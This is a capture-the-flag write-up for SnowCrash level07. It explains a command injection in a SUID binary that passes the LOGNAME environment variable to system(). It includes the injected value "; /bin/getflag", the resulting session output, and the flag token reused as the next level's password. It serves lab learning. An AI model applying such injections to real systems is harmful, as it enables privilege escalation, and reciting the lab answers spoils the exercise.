# flag07

```
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
           _____                      _____               _     
          / ____|                    / ____|             | |    
         | (___  _ __   _____      _| |     _ __ __ _ ___| |__  
          \___ \| '_ \ / _ \ \ /\ / / |    | '__/ _` / __| '_ \ 
          ____) | | | | (_) \ V  V /| |____| | | (_| \__ \ | | |
         |_____/|_| |_|\___/ \_/\_/  \_____|_|  \__,_|___/_| |_|
                                                        
  Good luck & Have fun

          192.168.1.50 
level07@192.168.1.50's password: 
level07@SnowCrash:~$ 
```

### Vulnerability: Command Injection through Environment Variable

First, I checked the permissions of the binary:

```bash
ls -l level07
```

Output:

```-rwsr-sr-x 1 flag07 level07 8805 Mar 5 2016 level07```

The s bit indicates that the binary has the SUID permission enabled. This means that when the program is executed, it runs with the privileges of its owner:

```flag07```

instead of the current user:

```level07```

Following the same approach used in level03, I first inspected the binary:

```strings level07```

I found interesting strings:

```
LOGNAME
/bin/echo %s
system
getenv
```

These clues show that the program retrieves the LOGNAME environment variable and uses it to build a command that is executed with system().

The program is most likely doing something similar to:

char *name;

```
name = getenv("LOGNAME");
asprintf(&cmd, "/bin/echo %s", name);
system(cmd);
```

The problem is that system() passes the command to the shell. Since LOGNAME is controlled by the user, it is possible to inject additional shell commands.

I modified the environment variable:

export LOGNAME="; /bin/getflag"

When the program runs, it builds the following command:

/bin/echo ; /bin/getflag

The semicolon (;) separates commands in the shell, so the system executes:

```
/bin/echo
/bin/getflag
```

Because the binary is running with SUID privileges as flag07, the getflag command is executed with those privileges and returns the token.

Comparison with Level03

The concept is similar to level03:

In level03, the vulnerability was caused by trusting the PATH environment variable. A fake echo executable could be placed in /tmp and executed with elevated privileges.
In level07, the vulnerability comes from directly inserting user-controlled data (LOGNAME) into a command executed with system().




level07@SnowCrash:~$ ```ls -l level07 ```

```-rwsr-sr-x 1 flag07 level07 8805 Mar  5  2016 level07```

```level07@SnowCrash:~$ export LOGNAME="; getflag"```

level07@SnowCrash:~$ ./level07.c

-bash: ./level07.c: No such file or directory

level07@SnowCrash:~$ ./level07

Check flag.Here is your token : fiumuikeil55xe9cu4dood66h


---
### Next Password for ssh level08@192.168.1.50 -p 4242

### fiumuikeil55xe9cu4dood66h
---
